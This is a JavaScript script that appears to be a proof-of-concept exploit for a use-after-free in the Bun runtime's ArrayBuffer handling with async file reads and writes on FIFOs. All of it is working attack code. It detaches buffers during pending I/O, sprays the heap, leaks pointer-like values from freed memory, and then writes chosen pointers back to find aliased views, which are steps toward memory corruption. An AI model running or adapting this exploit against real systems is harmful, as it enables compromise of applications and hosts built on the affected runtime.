import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
const leakAttempts = Number(process.env.LEAK_ATTEMPTS || 8);
const writeAttempts = Number(process.env.WRITE_ATTEMPTS || 4);
const leakOffsets = parseNumberList(process.env.LEAK_OFFSETS || "8,16,24,80");
const writeOffsets = parseNumberList(process.env.WRITE_OFFSETS || "8,16,24");
const deltas = parseBigIntList(process.env.DELTAS || "0");
const sourceFill = Number(process.env.SOURCE_FILL || 0x31);
const targetFill = Number(process.env.TARGET_FILL || 0x71);
const aliasWrite = Number(process.env.ALIAS_WRITE || 0x44);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));

const sourceViews = [];
const targetViews = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function parseNumberList(input) {
  return input.split(",").filter(Boolean).map(value => Number(value.trim()));
}

function parseBigIntList(input) {
  return input.split(",").filter(Boolean).map(value => BigInt(value.trim()));
}

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-arraybuffer-pointer-field-sweep-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try {
      fs.closeSync(fd);
    } catch {}
  }
  try {
    fs.unlinkSync(fifo.path);
  } catch {}
}

function isAgain(e) {
  return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const written = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (written === 0) break;
      filled += written;
    } catch (e) {
      if (isAgain(e)) break;
      throw e;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;

  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (e) {
      if (!isAgain(e)) throw e;
    }

    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }

  return Buffer.concat(chunks, total);
}

function readU64LE(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function writeU64LE(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

function hex(value) {
  return `0x${value.toString(16).padStart(16, "0")}`;
}

function isPointerLike(value) {
  return value >= 0x0000100000000000n && value <= 0x00007ffffffffffen && (value & 0x7n) === 0n;
}

function allocateViews(out, fillBase) {
  out.length = 0;
  for (let i = 0; i < sprayCount; i++) {
    const view = new Uint8Array(new ArrayBuffer(viewSize));
    view.fill((fillBase + (i & 15)) & 0xff);
    out.push(view);
  }
}

async function leakMetadata() {
  const fifo = makeFifo("leak");
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(uafSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);

    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });

    detach(ab);
    gcNow();
    allocateViews(sourceViews, sourceFill);
    gcNow();

    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, uafSize, "metadata");
    const result = await done;
    const words = [];
    for (let offset = 0; offset + 8 <= Math.min(uafSize, 128); offset += 8) {
      const value = readU64LE(leaked, offset);
      words.push({ offset, value: hex(value), pointerLike: isPointerLike(value) });
    }
    return {
      bytesWritten: result.bytesWritten,
      err: result.err?.message,
      prefix: [...leaked.subarray(0, Math.min(96, leaked.length))],
      words,
    };
  } finally {
    closeFifo(fifo);
  }
}

async function findLeak() {
  const attempts = [];
  for (let i = 1; i <= leakAttempts; i++) {
    const leak = await leakMetadata();
    attempts.push({ attempt: i, words: leak.words.slice(0, 12), prefix16: leak.prefix.slice(0, 16) });
    const candidates = leakOffsets
      .filter(offset => offset + 8 <= uafSize)
      .map(offset => ({ offset, value: BigInt(leak.words[offset / 8]?.value || "0") }))
      .filter(candidate => isPointerLike(candidate.value));
    if (candidates.length > 0) return { leak, attempts, candidates };
  }
  return { leak: null, attempts, candidates: [] };
}

function scanTargetAnomalies(limit = 8) {
  const anomalies = [];
  for (let i = 0; i < targetViews.length; i++) {
    const expected = (targetFill + (i & 15)) & 0xff;
    let first;
    let last;
    try {
      first = targetViews[i][0];
      last = targetViews[i][viewSize - 1];
    } catch (error) {
      first = `threw:${error?.message || error}`;
    }
    if (first !== expected || last !== expected) {
      anomalies.push({ targetIndex: i, first, last, expected });
      if (anomalies.length >= limit) break;
    }
  }
  return anomalies;
}

function scanSourceWrite(value, limit = 8) {
  const hits = [];
  for (let i = 0; i < sourceViews.length; i++) {
    if (sourceViews[i][0] === value) {
      hits.push({ sourceIndex: i, value });
      if (hits.length >= limit) break;
    }
  }
  return hits;
}

async function writeCandidate(writeOffset, pointer) {
  if (writeOffset < 0 || writeOffset + 8 > uafSize) {
    throw new Error("WRITE_OFFSETS entries must fit inside UAF_SIZE");
  }

  const path = join(tmpdir(), `bun-arraybuffer-pointer-field-sweep-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);

  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise(resolve => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
    });

    detach(ab);
    gcNow();
    allocateViews(targetViews, targetFill);
    gcNow();

    fs.writeSync(fd, writeU64LE(pointer), 0, 8);
    const result = await done;
    const anomalies = scanTargetAnomalies();
    const aliasWrites = [];
    for (const anomaly of anomalies) {
      try {
        targetViews[anomaly.targetIndex][0] = aliasWrite;
        aliasWrites.push(...scanSourceWrite(aliasWrite, 2).map(hit => ({ targetIndex: anomaly.targetIndex, ...hit })));
      } catch (error) {
        aliasWrites.push({ targetIndex: anomaly.targetIndex, error: error?.message || String(error) });
      }
      if (aliasWrites.length >= 8) break;
    }

    return {
      bytesRead: result.bytesRead,
      err: result.err?.message,
      anomalies,
      aliasWrites,
    };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

const { leak, attempts, candidates } = await findLeak();
if (!leak) {
  console.log(JSON.stringify({
    uafSize,
    viewSize,
    sprayCount,
    leakOffsets,
    writeOffsets,
    deltas: deltas.map(hex),
    attempts,
    candidates: [],
    writes: [],
  }));
  process.exit(1);
}

console.log(JSON.stringify({
  phase: "leak",
  uafSize,
  viewSize,
  sprayCount,
  leakOffsets,
  writeOffsets,
  deltas: deltas.map(hex),
  attempts,
  leakPrefix: leak.prefix,
  leakWords: leak.words,
  candidates: candidates.map(candidate => ({ offset: candidate.offset, value: hex(candidate.value) })),
}));

const writes = [];
for (const candidate of candidates) {
  for (const delta of deltas) {
    for (const writeOffset of writeOffsets) {
      for (let attempt = 1; attempt <= writeAttempts; attempt++) {
        const pointer = candidate.value + delta;
        const result = await writeCandidate(writeOffset, pointer);
        writes.push({
          leakOffset: candidate.offset,
          leakedPointer: hex(candidate.value),
          delta: hex(delta),
          writeOffset,
          attempt,
          pointer: hex(pointer),
          ...result,
        });
        if (result.aliasWrites.length > 0) break;
      }
    }
  }
}

const aliasCount = writes.reduce((count, write) => count + write.aliasWrites.length, 0);
console.log(JSON.stringify({
  uafSize,
  viewSize,
  sprayCount,
  leakOffsets,
  writeOffsets,
  deltas: deltas.map(hex),
  attempts,
  leakPrefix: leak.prefix,
  leakWords: leak.words,
  candidates: candidates.map(candidate => ({ offset: candidate.offset, value: hex(candidate.value) })),
  writes,
}));

process.exitCode = aliasCount > 0 ? 86 : 1;
